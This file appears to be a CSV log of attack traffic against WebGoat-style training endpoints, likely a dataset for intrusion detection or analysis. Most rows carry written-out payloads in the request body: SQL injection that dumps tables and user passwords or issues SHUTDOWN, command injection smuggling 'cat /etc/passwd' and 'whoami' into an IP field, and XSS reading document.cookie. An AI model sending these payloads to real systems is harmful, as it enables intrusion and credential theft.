_id,signature,body_bytes_sent,ip,request.method,request.path,request.protocol,request_body,status,timestamp
5b802035-fd7b-42db-a6cd-d30c8f252b9d,bccfe3a6a5c81bcea3cb7c98d153afcc,14753,191.244.98.213,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'zOtj1s8P'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:06:40.514892
4c2eb3ef-8d2e-4c67-8d42-627eba53cfaf,59ad4887094bee00dc66efca29472285,367,177.188.142.154,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1960'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:06:40.521415
d52a232b-bf80-4d25-8cc7-b72e87cfb285,6be494d6259b9e2209466f34d789e95b,14745,194.55.26.235,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:40.575159
9839cd01-5701-426b-98c9-e6a4fa528000,eedd02717d2d5adf469daef3c48994ab,273,163.239.111.173,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1744'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:06:40.582558
2a22b586-7f13-41df-a60a-0b86c0eecbe0,469408610f0ef59322099fa356038edf,279,138.255.62.167,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=AzyJLqvK,200,2025-10-12T01:06:40.634886
54066e66-c4f7-4c20-8607-5bb9037c26ca,3fd9b65d4060e426443b910122b9a59b,14745,221.105.140.149,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:40.690651
885866a2-e95f-4282-90cf-54d4552ecccd,7ad7b1d93c07867db07d85bcd4062a35,273,165.188.239.250,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2506'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:06:40.739410
ad82db3b-c767-41b9-943f-4eba12c655c7,ca0c3492e782dc27ab70ef8bd8f0ab4b,14753,206.169.202.171,POST,cia/command-injection,HTTP/1.1,"[('_uid', '9WIQjz7g'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:06:40.801114
7cb1d596-3da1-48e7-bdcf-6fd9c6e28a62,a325ba0def9dcd0a80b1b0f7d61a2c21,14753,128.88.122.254,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'JK9LpU1q'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:06:40.807912
e76a1771-e4fc-4a3b-b9d2-2bc78ce2a0df,e6d440832269b6e0adf13c6d6b348088,279,215.43.11.207,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=LVponlM4,200,2025-10-12T01:06:40.831007
beee735d-7b79-4279-8b50-f43ce280809f,f6e2e2f3c0b7bd1bb19977837f9d7770,279,75.249.206.131,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=8VVGB81w,200,2025-10-12T01:06:40.888257
2c2cb343-9811-4037-8e6c-7651c7d12637,4c68112c40a5d1faf70c10c61d3300fa,14753,175.209.74.179,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'GGEbCi6S'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:06:40.943372
d1dcab81-62f8-4098-bb96-48a3328f39af,200f18d377f2add82d77703498ca9083,14753,142.62.26.162,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'Wm3X8KQj'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:06:40.953237
357fc91d-74cf-49c2-b968-bdd19b9367e2,6484d7f889c6290b62b31208aa638af1,279,3.156.36.204,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=HIUzjHxR,200,2025-10-12T01:06:40.963472
708fadc9-3acd-462a-83f1-f767575a9615,7da66200542ee5059a6c1424b3b88bad,14745,1.239.83.77,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:41.019092
c6a62b2e-69af-47f9-97fc-e7fe75bf12c1,2ea0d66e78553c41afa5fb9d82a442c7,367,100.232.61.86,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8169'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:06:41.068361
736ff26d-997a-4c11-9f87-88172d07d5c7,af5bbea9436da0b9b66b5428121a4dc3,14753,139.81.72.38,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'VX5DNcxx'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:06:41.142187
c48f41a2-8917-47f5-b0e2-4333b1e3cfa6,38c614788a773106820f05f8b6c5408d,273,85.182.246.121,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9132'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:06:41.146343
ec2655c6-178d-44d7-b63c-511dc9cfa023,f46fe8081f85abb524e8822d9f5b5cdb,14745,150.215.103.110,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:41.204839
b16378f2-b466-479c-90a0-8091d621ee7a,887791e42905e81f8878954da5ef7d1e,279,173.30.36.116,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=UrqeRAZf,200,2025-10-12T01:06:41.254180
79c06e5c-3953-47c0-b110-ba06ea7a81bf,64f198b0a0c8c7a4e363be1a1c61501b,273,34.229.113.132,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6461'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:06:41.310916
0b107bd6-758d-43f0-94a3-0e8385deb22d,ad9516e9fcb701979b9228aaf6478bce,14753,121.86.169.36,POST,cia/command-injection,HTTP/1.1,"[('_uid', '40cOvhHE'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:06:41.373386
d6fdaeb5-4e8e-4274-9d45-c3d7981dadc4,c93afd9143b7101ba59c59c290106d41,273,84.147.81.190,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1345'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:06:41.378775
875f1254-5cdb-4897-b836-01b708f9352a,8101f81ba70516481238ce48dc1ad893,14753,61.188.116.128,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'itnfjxpZ'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:06:41.437897
0b57ee96-5dd0-43b6-bbc1-92ee9c02652a,cd0870f16a52e8ab9f0a248375dc91b8,273,195.16.163.140,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1852'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:06:41.443320
c3e48888-b9a1-44ef-8708-a6837bff8e35,1cff475c4733f4ed980ae6fdc26f7ada,14745,202.174.44.187,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:41.497248
7c9a6c2c-dcba-4834-ac49-e830baa0222d,ca9b7b4019be1822cb71f17d12dea75a,14745,76.7.83.38,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:41.544248
b983d954-72ab-47e8-a880-820736005885,e898f0e82bdd1cf03819208af4a16a2f,279,193.87.171.160,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=k10Hj0Lm,200,2025-10-12T01:06:41.595000
f4908481-6c6b-4d05-bbe5-9296ef9988bc,4803f012ea304471944e59b50c646bdc,279,61.54.106.39,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=4WgqqRBy,200,2025-10-12T01:06:41.664499
c81bba37-0baf-4f36-a2ce-2b73c7ccc4b8,3e769f609e7ce7289b38a58a5d7d1d64,367,13.80.92.122,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8958'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:06:41.717894
e2d0f3f3-47fa-406f-98fe-af4a4608c5bb,e7a263d4ce56bd24f2fab3bab2200c45,14745,192.15.38.12,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:41.776491
476b2a35-44a7-4088-ac72-6eb73a9b76c6,759bc4abea227dcd8545c2e74d1e2ed9,14753,78.39.105.15,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'jHekfe9N'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:06:41.828096
f090f0b7-6940-4581-a986-69e0be4a4422,332cf1f30300c51dd72c7d258db88bf1,14753,118.237.151.211,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'lS8t7TfC'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:06:41.835113
73979779-afad-4f0d-a7ee-59ac091821ae,167da34d92e6f7a25609e9943af9d00e,14753,90.201.47.195,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'KLQuPgkO'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:06:41.842651
670bcd81-09a7-4505-9954-6e45ac343f34,f01e41f2da6f99ede04d00da7255a6e3,279,78.225.112.103,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=Jwu6FGXf,200,2025-10-12T01:06:41.851141
8c641866-10cd-4be5-a33c-d55b91d05b9e,5ec3b00d1dd1a67f82ac64e2dc139bba,279,53.131.39.185,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=i0Tf2DZp,200,2025-10-12T01:06:41.915119
eb915509-e422-4b31-9366-04fd3990440f,be85475054dead913f3fe047c874e330,14745,37.123.131.60,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:41.971216
cad0bb8b-456b-4865-b390-7283789642c3,6a07850f6642ef9d289289e81cee1760,14753,10.164.253.162,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'r7drDn5B'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:06:42.023457
53920e40-f565-447e-8c68-4c2900bc7f27,fce1111d74d9162838c6d3b1b3bd8a0f,367,75.18.184.150,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3926'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:06:42.026503
ac775504-c2f1-44a3-9722-d11e12348dcb,4529c31bde91f7b0d02b9ce6d6fdc17f,367,50.222.46.110,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2797'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:06:42.084516
de3e11c3-4c9a-4f33-85ff-191c850b30a9,10ae1af06d4e9cd4fb163d7aaf4e8102,279,186.59.185.62,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=8PVkB7hF,200,2025-10-12T01:06:42.140723
69b0919a-f8a2-45be-b032-4c971a60def5,6cb66291f0764ccc1cfd313eef4e270a,273,164.131.132.184,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7812'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:06:42.194070
5adc78ca-52ac-459a-9945-a4d55e89217e,97f522d5f3b6dddcf06364130e42992e,273,100.139.104.124,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3050'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:06:42.254224
0a9074bd-4bbf-4f01-9936-9f68e77273e4,376f806e3277222f8615509565dabc62,367,141.47.87.56,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6108'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:06:42.310539
e059d9c0-e3c0-40b5-a7f2-f6b48932ebc3,e0f6a8c6627c77195e687655a6b88283,367,77.22.227.153,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8923'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:06:42.364737
d80401b1-a8b4-4c16-99cd-d285ac468c51,7c6ad82e88c8bd5e92b40f9c33d0721e,14745,165.15.243.147,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:42.429193
a7b03c12-6f3e-45f7-b095-96bad3d9509f,5e55a5ec37b622bc1e5779de41386ba1,14753,193.147.187.56,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'n15O05mG'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:06:42.476903
ee911f23-0311-4f57-8e86-e903ffbe5262,836bf4b6a3bf08bb59d7dc74819de0e3,273,92.98.100.160,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4974'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:06:42.484693
3581a3e7-55b7-4251-b2f6-8dbfef6e78c9,0ac8e0866b1fb82e70ad8e76f87bc1cc,14753,170.163.21.81,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'j201PcAR'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:06:42.539500
2a5e1d33-9d8c-4bef-832c-66efaa412321,cfbddcd269b2263c39136c417550ac24,273,106.246.92.52,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3529'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:06:42.547951
33bae1f6-d9b5-49a1-a0e2-21a0b776fb5e,9daad0dc8e25973c61eb7ce8c2dab10a,14753,209.73.85.95,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'faI5r6Lv'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:06:42.601251
3187aed4-5281-40bb-b292-152140fb3c26,7c705137c383f432de82940f9ee35d2c,14745,13.225.133.30,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:42.608063
24a94925-8763-40e0-85f7-e7cc1daf2ef7,baf3a1341b69854d5741062dddb86448,14753,63.80.81.80,POST,cia/command-injection,HTTP/1.1,"[('_uid', '6avjY5Zv'), ('ip', '127.0.0.1 & whoami')]",404,2025-10-12T01:06:42.654357
599b97be-577f-491f-948f-735d5d4f1fb9,56ebe0a994baec8e9a5e8c7b206e8b80,14753,120.178.55.87,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'rnxygsgj'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:06:42.662960
4632335d-5e2c-4962-b987-965a8267efa6,9d071ed08a9f8ed78330b979786abfe6,279,210.34.50.13,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=XbHkudKJ,200,2025-10-12T01:06:42.666333
f110d9bf-a9e1-479a-be24-13b2e0e500fb,078a666fd7c125700bbc1dd15be19f7b,14753,90.197.159.34,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'WzBRQIqO'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:06:42.725394
9f0ae1ca-8ae0-4cfd-bbd2-c8e0dfb73afc,ad824ddcceda2c762541e4aa79506258,14745,168.14.236.158,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:42.731194
8101a884-c57a-4f47-853f-3da0f312b25b,cec365890c36a9deda1780455e90d32c,273,33.25.41.69,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '2485'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:06:42.778094
53cbb6f2-6a8a-4e53-8b4e-9e490a773b1b,31ccbee4c7a40869c5011aa9b982214f,14745,107.69.138.148,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:42.838552
e863f698-a6df-4d6c-8825-cf327039ff1a,34b65d94f00bacdc53434c424269b8ae,279,179.140.189.103,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=te9EtfK0,200,2025-10-12T01:06:42.890447
0d224c1c-961e-4cdb-87e0-d1bec7ad06b0,3c40238a71c69e53a93a5b7de50b3320,14753,172.67.230.183,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'TBjW1ELQ'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:06:42.941483
4486ab5f-611a-4255-b86e-d8aabcb518b1,18085dab1aae32dce758fb9d6fd3ef7a,14753,81.136.161.211,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'oiXKKaNd'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:06:42.948807
6a210528-93c5-49b1-9779-41874ccd34d0,492f67258c56a5fefcfca689b85de25f,14745,59.51.77.169,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:42.994572
3694edbe-3d6d-4238-9d8b-37feb842c038,d51feff2f91d252a9ab123f49c6e711e,14745,46.133.172.57,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:43.046416
1da6f5a0-8799-443e-8b56-63ec5c7d4b88,b4be88336dcfb36c4fc9ab6bb5c99427,279,194.121.202.248,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=iL00AZqE,200,2025-10-12T01:06:43.095257
96f5d0f0-e0a0-424b-b80a-5fd5fb037417,1b1ca4a59cb6ea619c983b0be098926d,273,172.64.132.52,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '9462'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:06:43.165631
6257a729-6827-44ed-8841-3a211d31b09a,201ee821bd23abc332d06d9845cc66ea,279,84.214.113.140,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=8rU8t3WQ,200,2025-10-12T01:06:43.223362
8b2cb43a-de0b-434f-b216-efcd945557f7,85eb62bd56fcfaacaae66ef37bef22b1,14745,143.10.231.23,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:43.281029
0a3302ed-c2a8-4228-9efe-0d97910ec154,f59a8354bd2ff69d8452a7427a61934d,279,37.130.172.88,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=EqYKl0Vr,200,2025-10-12T01:06:43.330679
da2180ec-44e5-4aa5-ba0a-e7c3d92a6d19,60350ceeeeaeba2261fcc49dde8f7ebe,273,120.112.41.214,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3326'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:06:43.388167
6023e767-733f-47e0-ae4c-60ae58c66a26,57cda9ffc1a3d9ce0e3dde015374b9c8,14745,18.209.141.126,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:43.445066
3b3a9281-cc81-4267-b14a-fe9c5ce92501,4964642fcda85b0025086f893d4c131a,279,202.200.221.230,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=OoPqFr4K,200,2025-10-12T01:06:43.495621
94ca5446-e12c-4e66-b1d3-a076e64e4100,71337419a18a2cad32e6bc65c45305d4,14753,92.243.33.111,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'qBkQVuBR'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:06:43.549619
1b6ccc7d-18d8-417b-8696-a91acc8fc0b1,9e0b3f980c273f65d7197452baa4b112,14753,81.79.205.217,POST,cia/command-injection,HTTP/1.1,"[('_uid', '9Zo5Ulf1'), ('ip', '127.0.0.1 | ls -la')]",404,2025-10-12T01:06:43.557815
df3534a0-7d86-4108-af38-98ebc450729d,6a30d8edddd721411b9d2d8fa364db8c,279,30.135.93.58,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=plte9Gjz,200,2025-10-12T01:06:43.602517
58824071-c8c4-47ef-aaac-d7ffdb342113,57a358f84ed0e6ef63e24d8437b29ba4,307,33.113.64.212,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6315'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:06:43.664089
bce79363-f323-4872-9361-9f79ed40dd23,0ece886a70468364f0464ad67658ced5,14745,138.109.72.191,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:43.905168
164b90e7-7857-4b15-bae9-d5a789b9c691,5fb9663bafe30147ea3caeee21fdec66,273,156.204.145.183,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8905'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:06:43.913479
8d88c455-1670-4146-8327-723383d07b7f,bd4b295bb785ce9684c502610b24d86e,279,98.133.71.77,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<iframe src='javascript:alert(`XSS`)'></iframe>&_uid=N9bd2lhl,200,2025-10-12T01:06:43.969987
1a79d84d-6103-4a54-956a-f53b56102c89,2aa4dd421ffa550d1326310cdc1d5876,273,180.61.75.49,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8226'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:06:44.024814
c9863a5d-17b4-4dac-b94b-04ace01dd675,1bcc0363d82fab352ffa4e167a6781e8,367,24.75.183.88,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '8401'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:06:44.089384
2289ea8d-aaf6-488a-89ca-281cc392b063,93c1f7b074df25887b645892e967a0ca,14753,14.0.211.111,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'K9iPW8SK'), ('ip', '127.0.0.1 | netstat -an')]",404,2025-10-12T01:06:44.144517
bdbbbac6-6f0c-4216-b51e-f0c98fc92adc,34afbe872a577e96111cff13723e7f89,367,202.96.142.164,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '3948'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:06:44.154872
d4ec8399-8c1d-42fc-a42a-9af25032f56e,646ac8d09d4deed9331fe336b8416775,279,9.162.120.25,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=AVg2EL5Q,200,2025-10-12T01:06:44.214775
53738745-d157-4915-b5f3-cd17689837d3,5eb1c1d61d9246aac3962707ac107c98,279,73.243.232.165,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<svg onload=alert(1)>&_uid=4TFDHOrL,200,2025-10-12T01:06:44.272029
80067427-8d85-4d46-94df-dd331465cc72,c2aaa03177680310fa4a72f0c6ad6490,279,47.203.68.135,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=h24kvc1z,200,2025-10-12T01:06:44.337979
0640362a-7b39-4c18-a42d-2b47d9ebc02f,48f0c6ea7b0f37161df385acaa26444b,14753,20.98.42.181,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'bIW25J9P'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:06:44.409508
4703cbdc-2426-4c1c-97d7-07c270e3ead7,90d2fde866fb92f14ade6232f55f4578,14745,10.44.230.242,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:44.419327
982f71c7-ca30-4e5e-b8ad-398c4748f643,dd5da76641838043ebe30156ac5c2b11,14753,221.135.40.17,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'IffQIijO'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:06:44.469870
6a936ba3-1f22-424a-802f-d94d6f60b5ae,cf4e509bbdc7c765a6b559ca830774b3,279,211.168.100.196,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=Y2x4WJGM,200,2025-10-12T01:06:44.474902
2d912a77-4250-4eb0-9f4b-efe595910733,121f8e25470b8750eb1f974f41d09083,279,95.49.128.32,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<img src=x onerror=alert(document.cookie)>&_uid=Sm1SO2Zh,200,2025-10-12T01:06:44.541234
55c906cb-5272-436d-a4b2-8e94aa4428f5,71fa3e91a8d981b84d21ce615bc526b1,273,149.51.86.96,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5507'), ('name', ""' OR '1'='1"")]",200,2025-10-12T01:06:44.595229
5d2a0310-5b31-46eb-9bc6-51db92aded2b,e2364da92e2266f93e6f0705d73860ad,279,206.108.255.122,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<ScRiPt>alert('XSS')</ScRiPt>&_uid=b10NQLTg,200,2025-10-12T01:06:44.650595
de80a6f2-581d-4d4f-aaf5-12f6db296891,5d302de7c90293e9d7fb364cddc84167,307,50.112.81.181,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '6556'), ('name', ""'; SHUTDOWN--"")]",200,2025-10-12T01:06:44.704031
cf2a1fdc-e815-4432-ad38-1066813b0862,476a431da6aae846bfc4676220dafee8,14745,106.203.165.71,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:44.928185
f250fb7b-ea13-43b3-9881-c1ece543e915,ed5dedd3b237d6ba1d4c207646efeb64,273,38.15.232.181,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7194'), ('name', ""' AND 1=2--"")]",200,2025-10-12T01:06:44.935778
a6188724-c9c6-4c31-a98b-3ab698a8e004,f6f3a814900c07f4b67fb4e5425be068,279,77.29.111.54,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=%3Cscript%3Ealert('XSS')%3C/script%3E&_uid=EIIENFpq,200,2025-10-12T01:06:44.994349
8eafb5bc-31f3-4095-a6bd-9127aca214d5,46e7e913c2f404a5ff4bb7b22de64f1d,367,50.96.186.222,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '5463'), ('name', ""' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--"")]",200,2025-10-12T01:06:45.053086
ffde93c1-8f6c-4b82-a4fc-7d0b781f5b00,79c44084cf8377b5e6165f5d943fdbb4,14745,164.140.181.134,POST,FileUpload/attack,HTTP/1.1,None,404,2025-10-12T01:06:45.111968
d9e2624d-42ef-46e0-ae31-c596b0489131,32dac76c166ebe8ec09edab92d4c40f2,367,8.99.40.157,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '7697'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:06:45.161186
727d0241-3404-4bde-a039-3c422693d091,0a522cf0722c48396cf17137d28241f1,367,92.235.129.174,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '1089'), ('name', ""' UNION SELECT null, user, password, 'webgoat_user', null FROM user_data--"")]",200,2025-10-12T01:06:45.224835
22af3ec5-68f9-48f5-9146-88433f4901b3,89848849da9b0a7b4487d83f2acabf3e,14753,15.138.232.103,POST,cia/command-injection,HTTP/1.1,"[('_uid', 'GyE5OPXx'), ('ip', '127.0.0.1 && cat /etc/passwd')]",404,2025-10-12T01:06:45.282649
45a07d6c-1d30-4a84-b858-bc3a764f7666,cdf80331e7367178eef09538d51b37e9,273,125.168.30.48,POST,SqlInjection/attack8,HTTP/1.1,"[('auth_tan', '4147'), ('name', '101 OR 1=1; --')]",200,2025-10-12T01:06:45.289859
4c03eeca-da25-4d23-942f-b76672a9c49b,2c7a388c857f71cd4377bd1ab8f17c06,279,115.152.244.169,POST,CrossSiteScripting/attack1,HTTP/1.1,text_area=<script>alert('XSS')</script>&_uid=o6ve0Juf,200,2025-10-12T01:06:45.348484
